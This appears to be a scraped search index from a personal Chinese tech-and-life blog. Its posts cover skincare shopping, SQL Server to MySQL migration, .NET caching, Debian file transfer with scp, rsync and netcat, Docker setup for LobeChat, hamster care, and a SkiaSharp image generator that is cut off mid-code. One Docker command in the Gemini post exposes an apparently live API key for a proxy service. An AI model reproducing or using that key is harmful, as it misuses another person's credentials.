修复护手霜：添加了维生素 E、乳木果油、尿囊素等具有修复功能的成分，可修复受损肌肤，改善粗糙、皲裂等问题。适合经常接触刺激性物质或手部肌肤较粗糙的人群。如凡士林修护晶冻，对于手部的干裂有很好的修复作用。 抗老化护手霜：含有视黄醇、辅酶 Q10、胜肽等成分，能促进胶原蛋白生成，减少手部细纹和皱纹，延缓手部肌肤衰老。适合年龄较大或注重手部抗衰的人群。如资生堂尿素护手霜，含有多种有效成分，在保湿的同时具有一定的抗老化功效。 使用方法：洗手后或感觉手部干燥时，取适量护手霜均匀涂抹于双手，包括手背、手掌和手指，轻轻按摩至完全吸收。尤其是指甲周围、指关节等容易干燥的部位，要重点涂抹。做家务或接触刺激性物品时，可佩戴手套，避免手部肌肤受到伤害，之后及时涂抹护手霜进行护理。\n最后，花200买东西给小美， 不一定能增加10%的好感度， 但要是拿这个钱请兄弟吃饭，兄弟90%认你当义父。\n我的义父在哪里？？\n今年，为了小美，含泪少吃两顿星期四。苍天啊，还是单身爽！！\n","permalink":"https://qfsyso.github.io/posts/for-oo/","summary":"购买前 量力而行，心意到了就行了。 这南墙也不一定非要撞过去。\n购买渠道： 某东 （隔天就到了） 淘天喵（便宜一点） 拼夕夕百亿补贴 （便宜亿点）\n护肤类 洁面产品： 用于清洁面部皮肤，去除污垢、油脂和杂质，为后续化妆步骤打下良好的基础。\n化妆水 / 爽肤水： 帮助收缩毛孔，补水保湿，使肌肤更加水润，为上妆做好准备。\n乳液 / 面霜： 滋润肌肤，锁住水分，防止皮肤干燥，使底妆更加服帖。\n注意 ​​敏感肌​​：优先无酒精、无香精的氨基酸洁面+修护型水乳。 ​​油痘肌​​：含酸类或控油成分的洁面+平衡水油的水乳）。 ​​干皮​​：保湿抗氧化洁面+抗衰提亮水乳。 性价比党/​​​​学生党：经典国货套装珀莱雅/自然堂闭眼入。\n洁面产品： 油皮：可以选择清洁力较强的非 “皂性” 洁面产品，如含有水杨酸、皂基等成分的洗面奶，能有效去除皮肤表面多余的油脂和污垢。 干皮和敏感皮：应选用温和、保湿的洁面产品，如氨基酸洗面奶，其 pH 值接近皮肤的 pH 值，能在清洁的同时保护皮肤的屏障功能。\n化妆水 / 爽肤水： 油皮：适合使用清爽型的化妆水，含有金缕梅、薄荷等成分，具有控油、收缩毛孔的作用。 干皮：可选择滋润型的化妆水，含有透明质酸、甘油等保湿成分，能为肌肤补充水分。 敏感皮：则适合具有舒缓、修复功能的爽肤水，含有马齿苋、洋甘菊等成分，可减轻皮肤的敏感症状。\n精华液： 美白：想要美白的人群可选择含有烟酰胺、维生素 C、传明酸等成分的精华液，能抑制黑色素的生成，提亮肤色。 抗皱：有抗皱需求的人群可以使用含有视黄醇、胜肽、玻色因等成分的精华液，能促进胶原蛋白的生成，减少皱纹。 保湿：干性皮肤可使用含有玻尿酸、角鲨烷等成分的保湿精华液，为肌肤深层补水保湿。\n乳液 / 面霜： 油皮：选择质地轻薄、不油腻的乳液，含有茶树精油、薰衣草等成分，具有控油、消炎的作用。 干皮：适合质地浓稠、滋润度高的面霜，含有羊毛脂、凡士林等成分，能在皮肤表面形成一层保护膜，防止水分流失。 混合皮：T 区使用清爽的乳液，两颊使用滋润的面霜。\n眼霜： 黑眼圈：针对黑眼圈问题，可选择含有咖啡因、维生素 K 等成分的眼霜，能促进眼部血液循环，减轻黑眼圈。 眼部细纹：有眼部细纹的人群可以使用含有胶原蛋白、辅酶 Q10 等成分的眼霜，能增强眼部肌肤的弹性。\nbuybuybuy 可复美 柔肤水 500ml 65 补水保湿，质地清爽不粘腻，易于吸收。可用于日常补水、湿敷等。 珀莱雅红宝石面霜 50g 165 保湿滋养，淡纹紧致，饱满肌肤 珀莱雅水动力护肤套装 [100g洁面 135ml水乳] 79 plus版本 面+水+乳+霜 119 改善面部毛孔粗大、暗沉粗糙等问题，帮助肌肤锁水保湿，调节水油平衡，令肌肤细腻通透。 优时颜 [水150ml+乳100g] 140","title":"For oo"},{"content":"DBeaver https://github.com/dbeaver/dbeaver/releases 简介：一款开源的多数据库管理工具，支持多种数据库系统，包括SQL Server和MySQL。利用DBeaver，可以轻松地在不同数据库系统之间进行数据迁移。 操作步骤：\n安装DBeaver： 从官网下载并安装DBeaver到计算机上。\n连接到SQL Server： 在DBeaver中，点击“Database” \u0026gt; “New Database Connection”，选择“SQL Server”并填写连接信息。\n连接到MySQL： 同样的步骤，点击“Database” \u0026gt; “New Database Connection”，选择“MySQL”并填写连接信息。\n导出SQL Server数据： 在成功连接SQL Server后，选择需要迁移的表，然后右键点击并选择“Export Data”，在弹出的窗口中，选择“MySQL”作为目标。\n导入到MySQL： 在导出设置中，配置好MySQL连接的信息，并选择目标数据库，点击“Start”开始导入过程。\n主键 自增处理 -- 修改现有列为自增主键 ALTER TABLE ZX.Lies MODIFY COLUMN ID INT AUTO_INCREMENT PRIMARY KEY; ALTER TABLE your_table_name MODIFY Content VARCHAR(1000); ALTER TABLE zx.Lies MODIFY Content6 VARCHAR(1000); DROP TABLE zx.ZhongjieProducts MySQL Workbench Migration Wizard ​​步骤：​\n安装依赖​​： 安装 MySQL Workbench。 https://dev.mysql.com/downloads/workbench/ 安装 ODBC Driver for SQL Server。 https://learn.microsoft.com/en-us/sql/connect/odbc/download-odbc-driver-for-sql-server ​​配置 ODBC 数据源​​： 在 Windows 的 ODBC 数据源管理器中，添加 SQL Server 的 ODBC 连接。\n​执行迁移​​： 打开 MySQL Workbench，选择 Database -\u0026gt; Migration Wizard。 选择源数据库类型为 SQL Server，通过 ODBC 连接。 连接目标 MySQL 数据库。 选择要迁移的表，自动转换 Schema（检查数据类型是否合理）。 启动数据迁移。 ​​注意事项​​：\n迁移前在 MySQL 中创建目标数据库。 检查自增字段、字符集（推荐 utf8mb4）、存储引擎（如 InnoDB）。\n配置数据迁移 1.启动迁移功能 双击打开MySQL workbench，点击数据迁移功能，再点击开始迁移按钮\n2.配置源端/目标端 2.1 源端选择 Microsoft SQL Server\n需要安装SQL Server驱动：Download Microsoft® SQL Server® 2012 Native Client - QFE from Official Microsoft Download Center\n下载完成后，双击安装包点下一步即可\n2.2 目标端默认为MySQL\n配置完成后，点击 Next\n3.获取源端schema列表 点击 Next 即可\n4.选择要迁移的schema 保持默认配置即可（3个选项与目标端库表名映射有关），点击 Next\n5.逆向工程 Reverse Next\n6.选择迁移对象 可以在下面的列表选择要迁移的对象，默认是迁移第4步中选择的schema下的所有表\nshow selection Next\n7.迁移 Migration 将SQL Server对象 自动转换为MySQL兼容对象，将使用默认数据类型和默认列值映射。\n8.手动编辑 查看和编辑迁移对象，可以在它们被应用到目标数据库之前进行编辑 右上角 View Column Mappings\nMigration Problems： 这将报告问题或显示“未找到映射问题”。\nAll Objects：一个对象视图，用于查看和编辑对象定义。双击一行以修改目标对象的名称。\nColumn Mappings：显示所有表列映射，并允许您单独查看和修复所有列类型、默认值和其他属性的映射。\n9.目标端创建选项 可以选择在目标端数据库创建对象、或者生成创建SQL的脚本文件或两者都可以选择。 Next\n10.创建schema 在目标端正式创建对象\n11.目标端创建结果 这里列出了生成的对象，以及错误消息（如果存在）。\n也可以在此处查看和编辑迁移代码。若要进行更改，请选择一个对象，编辑查询SQL语句，然后单击“Apply”。\n对每个要编辑的对象重复此过程。最后，单击“Recreate Objects”以保存结果。\n12.数据传输设置 Online copy of table data to target RDBMS:此方法（默认）将数据复制到目标端数据库。\nCreate a batch file to copy the data at another time:数据也可以转储到一个稍后可以执行的文件中，或者用作备份。此脚本使用MySQL连接来传输数据。\nCreate a shell script to use native server dump and load abilities for fast migration:与执行实时在线复制的简单批处理文件不同，这会生成一个要在源主机上执行的脚本，然后生成一个Zip文件，其中包含在目标主机上本地迁移数据所需的所有数据和信息。复制并提取目标主机上生成的Zip文件，然后执行导入脚本（在目标主机上），使用LOAD data命令将数据导入MySQL。\n13.批量数传输 Bulk Data Transfer\n根据上一步所选的选项，进行数据传输\n根据上一步所选的选项，进行数据传输\n14.迁移报告 数据迁移完成后，会自动生成报告，总结了整个迁移过程\n目标端SQL查询数据 查询数据\nSHOW DATABASES; +\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026ndash;+ | Database | +\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026ndash;+ | admxx | +\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026ndash;+ 8 rows in set (0.00 sec)\nSELECT * FROM test.t1\n","permalink":"https://qfsyso.github.io/posts/mssql-2-mysql/","summary":"DBeaver https://github.com/dbeaver/dbeaver/releases 简介：一款开源的多数据库管理工具，支持多种数据库系统，包括SQL Server和MySQL。利用DBeaver，可以轻松地在不同数据库系统之间进行数据迁移。 操作步骤：\n安装DBeaver： 从官网下载并安装DBeaver到计算机上。\n连接到SQL Server： 在DBeaver中，点击“Database” \u0026gt; “New Database Connection”，选择“SQL Server”并填写连接信息。\n连接到MySQL： 同样的步骤，点击“Database” \u0026gt; “New Database Connection”，选择“MySQL”并填写连接信息。\n导出SQL Server数据： 在成功连接SQL Server后，选择需要迁移的表，然后右键点击并选择“Export Data”，在弹出的窗口中，选择“MySQL”作为目标。\n导入到MySQL： 在导出设置中，配置好MySQL连接的信息，并选择目标数据库，点击“Start”开始导入过程。\n主键 自增处理 -- 修改现有列为自增主键 ALTER TABLE ZX.Lies MODIFY COLUMN ID INT AUTO_INCREMENT PRIMARY KEY; ALTER TABLE your_table_name MODIFY Content VARCHAR(1000); ALTER TABLE zx.Lies MODIFY Content6 VARCHAR(1000); DROP TABLE zx.ZhongjieProducts MySQL Workbench Migration Wizard ​​步骤：​\n安装依赖​​： 安装 MySQL Workbench。 https://dev.mysql.com/downloads/workbench/ 安装 ODBC Driver for SQL Server。 https://learn.","title":"MSSQL 2 MySQL"},{"content":".NET 单例缓存\n模拟数据库用户信息查询 using Microsoft.Extensions.Caching.Memory; using Microsoft.Extensions.Logging; using System; public static class CacheManager { // // 缓存实例 // private static readonly IMemoryCache _cache = new MemoryCache(new MemoryCacheOptions // { // SizeLimit = 1024 // 限制缓存最大条目数 // }); private static readonly MemoryCache _cache = new MemoryCache(new MemoryCacheOptions()); private static readonly ILogger _logger = LoggerFactory.Create(builder =\u0026gt; builder.AddConsole()).CreateLogger(\u0026#34;CacheManager\u0026#34;); /// \u0026lt;summary\u0026gt; /// 获取或创建缓存项（泛型方法） /// \u0026lt;/summary\u0026gt; public static T GetOrCreate\u0026lt;T\u0026gt;(string key, Func\u0026lt;ICacheEntry, T\u0026gt; factory, TimeSpan? expiration = null) { try { return _cache.GetOrCreate(key, entry =\u0026gt; { // 设置缓存策略 entry.SetSize(1); // 每个条目占1单位空间 if (expiration != null) { entry.AbsoluteExpirationRelativeToNow = expiration; } else { // 默认缓存策略：5分钟绝对过期 + 2分钟滑动过期 entry.AbsoluteExpirationRelativeToNow = TimeSpan.FromMinutes(5); entry.SlidingExpiration = TimeSpan.FromMinutes(2); } _logger.LogInformation($\u0026#34;缓存未命中，正在生成数据: {key}\u0026#34;); return factory(entry); }); } catch (Exception ex) { _logger.LogError(ex, $\u0026#34;缓存操作失败: {key}\u0026#34;); throw; } } /// \u0026lt;summary\u0026gt; /// 清除指定缓存项 /// \u0026lt;/summary\u0026gt; public static void Remove(string key) =\u0026gt; _cache.Remove(key); /// \u0026lt;summary\u0026gt; /// 清空所有缓存 /// \u0026lt;/summary\u0026gt; public static void Clear() =\u0026gt; _cache.Compact(1.0); // 释放100%缓存 } /// \u0026lt;summary\u0026gt; /// 模拟实际业务逻辑：用户信息服务 /// \u0026lt;/summary\u0026gt; public static class UserService { /// \u0026lt;summary\u0026gt; /// 获取用户信息（带缓存） /// \u0026lt;/summary\u0026gt; public static UserInfo GetUserInfo(int userId) { return CacheManager.GetOrCreate( key: $\u0026#34;UserInfo_{userId}\u0026#34;, factory: entry =\u0026gt; { // 模拟实际业务逻辑：数据库查询 var user = QueryDatabase(userId); // 设置缓存依赖：如果用户被修改则立即过期 entry.AddExpirationToken(new UserChangeToken(userId)); return user; }, expiration: TimeSpan.FromMinutes(10) // 特定业务缓存时间 ); } // 模拟数据库查询 private static UserInfo QueryDatabase(int userId) { // 模拟耗时操作 System.Threading.Thread.Sleep(1000); return new UserInfo( Id: userId, Name: $\u0026#34;User_{userId}\u0026#34;, LastLogin: DateTime.UtcNow, Email: $\u0026#34;{userId}@example.com\u0026#34; ); } } /// \u0026lt;summary\u0026gt; /// 用户信息模型 /// \u0026lt;/summary\u0026gt; public record UserInfo( int Id, string Name, DateTime LastLogin, string Email ); /// \u0026lt;summary\u0026gt; /// 自定义缓存依赖：当用户数据变更时触发缓存过期 /// \u0026lt;/summary\u0026gt; public class UserChangeToken : Microsoft.Extensions.Primitives.IChangeToken { private readonly int _userId; private bool _hasChanged; public UserChangeToken(int userId) =\u0026gt; _userId = userId; public bool HasChanged =\u0026gt; _hasChanged; public bool ActiveChangeCallbacks =\u0026gt; false; // 实际项目中可调用此方法触发过期 public void NotifyChange() =\u0026gt; _hasChanged = true; public IDisposable RegisterChangeCallback(Action\u0026lt;object\u0026gt; callback, object state) =\u0026gt; Microsoft.Extensions.Primitives.EmptyDisposable.Instance; } 使用示例 var user = UserService.GetUserInfo(123); // 第一次调用会查询数据库并缓存 var user1 = UserService.GetUserInfo(123); // 第二次调用直接返回缓存 var user2 = UserService.GetUserInfo(123); // 当用户数据更新时（如修改邮箱） UpdateUserInDatabase(123); new UserChangeToken(123).NotifyChange(); // 手动触发缓存失效 // 下次调用将重新查询 var user3 = UserService.GetUserInfo(123); ​​防雪崩机制​​：\n// 可在factory方法中添加重试逻辑 .GetOrCreate(key, entry =\u0026gt; { try { return QueryDatabase(); } catch { entry.SetValue(GetFallbackData()); // 返回降级数据 entry.AbsoluteExpiration = DateTimeOffset.Now.AddSeconds(30); // 短期缓存异常 throw; } }) ​​监控指标​​：\n// 可扩展记录缓存命中率 public static int CacheHits { get; private set; } public static int CacheMisses { get; private set; } ","permalink":"https://qfsyso.github.io/posts/singlecache/","summary":".NET 单例缓存\n模拟数据库用户信息查询 using Microsoft.Extensions.Caching.Memory; using Microsoft.Extensions.Logging; using System; public static class CacheManager { // // 缓存实例 // private static readonly IMemoryCache _cache = new MemoryCache(new MemoryCacheOptions // { // SizeLimit = 1024 // 限制缓存最大条目数 // }); private static readonly MemoryCache _cache = new MemoryCache(new MemoryCacheOptions()); private static readonly ILogger _logger = LoggerFactory.Create(builder =\u0026gt; builder.AddConsole()).CreateLogger(\u0026#34;CacheManager\u0026#34;); /// \u0026lt;summary\u0026gt; /// 获取或创建缓存项（泛型方法） /// \u0026lt;/summary\u0026gt; public static T GetOrCreate\u0026lt;T\u0026gt;(string key, Func\u0026lt;ICacheEntry, T\u0026gt; factory, TimeSpan? expiration = null) { try { return _cache.","title":"SingleCache"},{"content":"Debian 系统之间传输文件\n​​1. 使用 scp（基于 SSH 的安全传输）​​ ​​适用场景​​：快速传输单个文件或目录，适合命令行操作。\n​​基本语法​​：\nscp [选项] 源文件 目标地址 ​​``` 示例​​： ​​从本地传输到远程服务器​​： ```bash scp /path/to/local/file.txt username@remote_ip:/path/to/remote/directory/ 输入远程服务器的用户密码后，文件会被传输。 ​​从远程服务器下载到本地​​：\nscp username@remote_ip:/path/to/remote/file.txt /path/to/local/directory/ ​​传输整个目录​​（使用 -r 递归）：\nscp -r /path/to/local/directory/ username@remote_ip:/path/to/remote/directory/ 如果目标端口 2222 scp -P 2222 /path/to/file username@ip:/path/to/destination ​2. 使用 rsync（高效同步工具）​​ ​​适用场景​​：增量同步文件或目录，适合大文件或频繁更新。\n​​基本语法​​：\nrsync [选项] 源路径 目标路径 ​``` ​示例​​： ​​同步本地目录到远程服务器​​： ```bash rsync -avz /path/to/local/directory/ username@remote_ip:/path/to/remote/directory/ -a：归档模式（保留权限、时间戳等） -v：显示详细过程 -z：压缩传输 ​​从远程服务器同步到本地​​：\nrsync -avz username@remote_ip:/path/to/remote/directory/ /path/to/local/directory/ ​​3. 使用 sftp（SSH 文件传输协议）​​ ​​适用场景​​：交互式文件传输（类似 FTP）。\n​​操作步骤​​： 连接远程服务器：\nsftp username@remote_ip 常用命令： 上传文件：put local_file.txt /remote/directory/ 下载文件：get /remote/file.txt /local/directory/ 切换本地目录：lcd /local/path 切换远程目录：cd /remote/path 退出：exit\n​​4. 使用 wget 或 curl（通过 HTTP/FTP）​​ ​​适用场景​​：通过 Web 服务器中转文件。\n​​步骤​​： 在源服务器启动 HTTP/FTP 服务（需安装 apache2/nginx/vsftpd 等）。 在目标服务器下载文件：\nwget http://source_ip/path/to/file.txt # 或 curl -O http://source_ip/path/to/file.txt ​5. 使用 nc（netcat 快速传输）​​ ​​适用场景​​：无需身份验证的临时传输（需确保网络安全）。\n​​步骤​​： 在接收端监听端口：\nnc -l 2222 \u0026gt; received_file.txt 在发送端传输文件：\nnc 接收端IP 2222 \u0026lt; 要发送的文件.txt ​注意事项​​： ​​SSH 配置​​：确保目标服务器的 SSH 服务已启动（默认端口 22）。 ​​权限问题​​：检查目标目录是否有写入权限（必要时使用 sudo 或 chmod）。 ​​防火墙​​：开放相关端口（如 22、80 等）。 ​​安全性​​：推荐使用 SSH 密钥认证（ssh-keygen）代替密码登录。\ndebian改密 sudo passwd 用户名\n","permalink":"https://qfsyso.github.io/posts/debian-scp/","summary":"Debian 系统之间传输文件\n​​1. 使用 scp（基于 SSH 的安全传输）​​ ​​适用场景​​：快速传输单个文件或目录，适合命令行操作。\n​​基本语法​​：\nscp [选项] 源文件 目标地址 ​​``` 示例​​： ​​从本地传输到远程服务器​​： ```bash scp /path/to/local/file.txt username@remote_ip:/path/to/remote/directory/ 输入远程服务器的用户密码后，文件会被传输。 ​​从远程服务器下载到本地​​：\nscp username@remote_ip:/path/to/remote/file.txt /path/to/local/directory/ ​​传输整个目录​​（使用 -r 递归）：\nscp -r /path/to/local/directory/ username@remote_ip:/path/to/remote/directory/ 如果目标端口 2222 scp -P 2222 /path/to/file username@ip:/path/to/destination ​2. 使用 rsync（高效同步工具）​​ ​​适用场景​​：增量同步文件或目录，适合大文件或频繁更新。\n​​基本语法​​：\nrsync [选项] 源路径 目标路径 ​``` ​示例​​： ​​同步本地目录到远程服务器​​： ```bash rsync -avz /path/to/local/directory/ username@remote_ip:/path/to/remote/directory/ -a：归档模式（保留权限、时间戳等） -v：显示详细过程 -z：压缩传输 ​​从远程服务器同步到本地​​：\nrsync -avz username@remote_ip:/path/to/remote/directory/ /path/to/local/directory/ ​​3. 使用 sftp（SSH 文件传输协议）​​ ​​适用场景​​：交互式文件传输（类似 FTP）。","title":"Debian SCP"},{"content":"免费gemini2.5 API 感谢佬友 bohe佬\nlobehub https://chat-preview.lobehub.com/chat\ndocker lobe docker run -d -p 32100:3210 \\ -e OPENAI_API_KEY=sk-GBxyVLH3pWoqFkLRC63PZhKPsVSPgLElvFtysmxPvZhZX5gi \\ -e OPENAI_PROXY_URL=https://x666.me/v1 \\ -e ACCESS_CODE=lobe66 \\ --name lobe-chat \\ lobehub/lobe-chat https://lobehub.com/zh/docs/self-hosting/platform/docker\n模型设置 openai sk-xx api地址 xxx/v1 获取模型列表 检查\nnewapi docker run -d -p 32100:3210 \\ -e OPENAI_API_KEY=sk-xxx \\ -e OPENAI_PROXY_URL=https://xxx.me/v1 \\ -e ACCESS_CODE=lobe66 \\ --name lobe-chat \\ lobehub/lobe-chat #or docker run --name new-api -d --restart always \\ -p 3000:3000 \\ -e TZ=Asia/Shanghai \\ -v /your/data/path:/data \\ calciumion/new-api:latest https://docs.newapi.pro/installation/docker-installation/\n","permalink":"https://qfsyso.github.io/posts/gemini-flash/","summary":"免费gemini2.5 API 感谢佬友 bohe佬\nlobehub https://chat-preview.lobehub.com/chat\ndocker lobe docker run -d -p 32100:3210 \\ -e OPENAI_API_KEY=sk-GBxyVLH3pWoqFkLRC63PZhKPsVSPgLElvFtysmxPvZhZX5gi \\ -e OPENAI_PROXY_URL=https://x666.me/v1 \\ -e ACCESS_CODE=lobe66 \\ --name lobe-chat \\ lobehub/lobe-chat https://lobehub.com/zh/docs/self-hosting/platform/docker\n模型设置 openai sk-xx api地址 xxx/v1 获取模型列表 检查\nnewapi docker run -d -p 32100:3210 \\ -e OPENAI_API_KEY=sk-xxx \\ -e OPENAI_PROXY_URL=https://xxx.me/v1 \\ -e ACCESS_CODE=lobe66 \\ --name lobe-chat \\ lobehub/lobe-chat #or docker run --name new-api -d --restart always \\ -p 3000:3000 \\ -e TZ=Asia/Shanghai \\ -v /your/data/path:/data \\ calciumion/new-api:latest https://docs.","title":"Gemini Flash"},{"content":"仓鼠小记\n✅ 主食类（基础粮） 仓鼠专用粮（建议）：市面上配比好的颗粒粮或混合粮，含有谷物、种子、坚果、维生素等，营养均衡。\n谷物类：小麦、燕麦、玉米、糙米、高粱。\n种子类：葵花籽（要适量）、南瓜籽、亚麻籽。\n📝 小贴士：不要只喂葵花籽，会太油腻，容易导致肥胖、脱毛。\n🥬 蔬果类（辅助） 可以吃的蔬果（洗净、少量喂）：\n胡萝卜\n黄瓜\n生菜（少量）\n苹果（去籽）\n南瓜\n西兰花\n香瓜、梨子（少量）\n🍎 注意：水果含糖高，要控制量，每次一点点！\n🥩 蛋白质补充 煮熟的鸡蛋白\n少量煮熟鸡肉、鱼肉（不加盐）\n面包虫、蚕蛹（仓鼠很爱！）\n酸奶滴（专用宠物用）\n🐛 面包虫是仓鼠最爱的“肉肉”，尤其怀孕或哺乳期的母鼠，补得刚刚好。\n❌ 不能吃的食物（危险） 食物\t原因 洋葱、大蒜\t有毒成分，伤害红细胞 巧克力、糖果\t对仓鼠致命，有可可碱和高糖分 柑橘类水果\t太酸，刺激肠胃 奶制品（如牛奶）\t容易腹泻 辛辣或油炸食品\t绝对禁止 酒精、咖啡\t有毒致命 💧 喝水也重要！ 一定要每天提供干净的清水，使用小水壶吊挂在笼子上，避免污染。\n🐹 仓鼠每日喂食计划（标准版） 时间\t食物类别\t举例和说明 早上 🕘\t✅ 主粮（基础粮）\t仓鼠专用混合粮约1小勺（8～10g） 放入主食碗中，仓鼠会分次吃或藏起来 中午 🕛\t✅ 新鲜蔬菜/少量水果\t🥕胡萝卜1小块 🥒黄瓜薄片1～2片 🍎苹果碎1小块（不要喂果核） 💡隔天替换，防止拉肚子 傍晚 🕔\t✅ 蛋白质补充\t面包虫2～3条（或熟蛋白少许） 换着来：鸡肉丝、宠物酸奶滴、少量煮鸡蛋 全天\t✅ 清水补充\t确保水壶干净，水要新鲜每天换一次 每周安排\t🔁 一周轮换食材\t每周给一次南瓜、玉米、香瓜、梨，少量更换口味保持食欲\n💡 喂食注意事项 ❄ 蔬果要室温喂，不要冰的！\n🧽 吃剩蔬果及时清理，避免发霉！\n🌰 零食控制在主粮的10%以内，避免肥胖。\n📆 每周可设置“断零食日”让仓鼠回归正餐。\n3 🧡 小贴士（按情况调整）： 幼鼠、怀孕母鼠 ➜ 蛋白质可适当加量；\n老年仓鼠 ➜ 主粮颗粒泡软一点，利于咀嚼；\n胖胖仓鼠 ➜ 减少高脂肪食物，比如葵花籽和面包虫。\n​​推荐水果​ 草莓（需洗净）、蓝莓、去皮葡萄、西瓜（少量果肉）等低酸度水果。\n​​禁忌水果​​： 柑橘类（橙子、柚子等）：酸性过高易刺激肠胃。 香蕉：高糖且易黏附颊囊，可能引发炎症。 番茄、石榴：酸性强且糖分过高。\n被咬后应急处理 ​​伤口清洁​​ 立即用肥皂水冲洗15分钟，挤出污血后以碘伏消毒，避免包扎过紧引发感染。 ​​感染监测​​ 若出现红肿、发热或化脓，需就医处理；深层伤口建议注射破伤风疫苗\n","permalink":"https://qfsyso.github.io/posts/hamster/","summary":"仓鼠小记\n✅ 主食类（基础粮） 仓鼠专用粮（建议）：市面上配比好的颗粒粮或混合粮，含有谷物、种子、坚果、维生素等，营养均衡。\n谷物类：小麦、燕麦、玉米、糙米、高粱。\n种子类：葵花籽（要适量）、南瓜籽、亚麻籽。\n📝 小贴士：不要只喂葵花籽，会太油腻，容易导致肥胖、脱毛。\n🥬 蔬果类（辅助） 可以吃的蔬果（洗净、少量喂）：\n胡萝卜\n黄瓜\n生菜（少量）\n苹果（去籽）\n南瓜\n西兰花\n香瓜、梨子（少量）\n🍎 注意：水果含糖高，要控制量，每次一点点！\n🥩 蛋白质补充 煮熟的鸡蛋白\n少量煮熟鸡肉、鱼肉（不加盐）\n面包虫、蚕蛹（仓鼠很爱！）\n酸奶滴（专用宠物用）\n🐛 面包虫是仓鼠最爱的“肉肉”，尤其怀孕或哺乳期的母鼠，补得刚刚好。\n❌ 不能吃的食物（危险） 食物\t原因 洋葱、大蒜\t有毒成分，伤害红细胞 巧克力、糖果\t对仓鼠致命，有可可碱和高糖分 柑橘类水果\t太酸，刺激肠胃 奶制品（如牛奶）\t容易腹泻 辛辣或油炸食品\t绝对禁止 酒精、咖啡\t有毒致命 💧 喝水也重要！ 一定要每天提供干净的清水，使用小水壶吊挂在笼子上，避免污染。\n🐹 仓鼠每日喂食计划（标准版） 时间\t食物类别\t举例和说明 早上 🕘\t✅ 主粮（基础粮）\t仓鼠专用混合粮约1小勺（8～10g） 放入主食碗中，仓鼠会分次吃或藏起来 中午 🕛\t✅ 新鲜蔬菜/少量水果\t🥕胡萝卜1小块 🥒黄瓜薄片1～2片 🍎苹果碎1小块（不要喂果核） 💡隔天替换，防止拉肚子 傍晚 🕔\t✅ 蛋白质补充\t面包虫2～3条（或熟蛋白少许） 换着来：鸡肉丝、宠物酸奶滴、少量煮鸡蛋 全天\t✅ 清水补充\t确保水壶干净，水要新鲜每天换一次 每周安排\t🔁 一周轮换食材\t每周给一次南瓜、玉米、香瓜、梨，少量更换口味保持食欲","title":"Hamster"},{"content":"批量生图 using SkiaSharp; public class Program { static void Main(string[] args) { Console.Write(\u0026#34;请输入要生成的图片数量：\u0026#34;); if (!int.TryParse(Console.ReadLine(), out int count) || count \u0026lt; 1) { Console.WriteLine(\u0026#34;输入无效，请输入大于0的整数\u0026#34;); return; } // 通过调整图像尺寸控制文件大小（经测试约1MB） const int imageSize = 2800; // 控制图片尺寸 const string outputDir = \u0026#34;OutputImages\u0026#34;; System.IO.Directory.CreateDirectory(outputDir); var sw = System.Diagnostics.Stopwatch.StartNew(); for (int i = 1; i \u0026lt;= count; i++) { using var bitmap = CreateNumberImage(imageSize, i); SaveImage(bitmap, $\u0026#34;{outputDir}/x{i}.png\u0026#34;); Console.WriteLine($\u0026#34;已生成：x{i}.png\u0026#34;); } Console.WriteLine($\u0026#34;\\n生成完成！耗时：{sw.Elapsed.TotalSeconds:F2}秒\u0026#34;); Console.WriteLine($\u0026#34;输出目录：{System.IO.Path.GetFullPath(outputDir)}\u0026#34;); } static SKBitmap CreateNumberImage(int size, int number) { var bitmap = new SKBitmap(size, size); using var canvas = new SKCanvas(bitmap); // 填充白色背景 canvas.Clear(SKColors.White); // 绘制渐变背景增加文件体积 using var gradient = SKShader.CreateLinearGradient( new SKPoint(0, 0), new SKPoint(size, size), new[] { SKColors.LightBlue, SKColors.White }, new[] { 0f, 1f }, SKShaderTileMode.Clamp); canvas.DrawRect(0, 0, size, size, new SKPaint { Shader = gradient }); // 绘制数字文本 var textPaint = new SKPaint { Color = SKColors.Black, TextSize = size * 0.4f, Typeface = SKTypeface.FromFamilyName(\u0026#34;Arial\u0026#34;, SKFontStyleWeight.Bold, SKFontStyleWidth.Normal, SKFontStyleSlant.Upright), IsAntialias = true }; // 计算文本居中位置 var text = number.ToString(); var textBounds = new SKRect(); textPaint.MeasureText(text, ref textBounds); var x = (size - textBounds.Width) / 2; var y = (size + textBounds.Height) / 2; canvas.DrawText(text, x, y, textPaint); return bitmap; } static void SaveImage(SKBitmap bitmap, string path) { using var image = SKImage.FromBitmap(bitmap); using var data = image.Encode(SKEncodedImageFormat.Png, 100); using var stream = System.IO.File.Create(path); data.SaveTo(stream); } } 实现说明： dotnet add package SkiaSharp ​文件大小控制： 通过设置2800x2800像素的画布尺寸，结合渐变背景和大型文本，生成约1MB的PNG文件 使用渐变背景（CreateLinearGradient）增加图像复杂度以提升文件体积 ​核心功能： 自动创建输出目录（OutputImages） 数字居中显示并采用大号粗体字体 支持1-999的生成数量（可扩展） 显示实时生成进度和总耗时\n使用硬件加速的SKCanvas进行绘图 采用抗锯齿文本渲染保证清晰度 自动计算文本居中位置\n相比传统System.Drawing方案具有更好的跨平台支持（Linux/macOS/Windows）和更优的性能表现\n图超过500个 优化性能 通过多核并行计算显著提升生成速度。该方案使用Parallel.ForEach结合生产者-消费者模式，相比基础并行方案可获得额外30%性能提升：\nusing System; using System.Collections.Concurrent; using System.Threading.Tasks; using SkiaSharp; class ParallelPngGenerator { const int ImageSize = 2800; const string OutputDir = \u0026#34;OutputImages\u0026#34;; static void Main(string[] args) { Console.Write(\u0026#34;请输入要生成的图片数量：\u0026#34;); if (!int.TryParse(Console.ReadLine(), out int count) || count \u0026lt; 1) { Console.WriteLine(\u0026#34;输入无效，请输入大于0的整数\u0026#34;); return; } var sw = System.Diagnostics.Stopwatch.StartNew(); System.IO.Directory.CreateDirectory(OutputDir); // 生产任务队列（1-100） var rangePartitioner = Partitioner.Create(1, count + 1); // 并行生成配置（根据CPU核心数优化） var parallelOptions = new ParallelOptions { MaxDegreeOfParallelism = Environment.ProcessorCount * 2 }; // 进度监控 var progress = new ProgressTracker(count); Parallel.ForEach(rangePartitioner, parallelOptions, (range, _) =\u0026gt; { for (int i = range.Item1; i \u0026lt; range.Item2; i++) { using var bitmap = CreateNumberImage(ImageSize, i); SaveImage(bitmap, $\u0026#34;{OutputDir}/x{i}.png\u0026#34;); progress.ReportProgress(); } }); 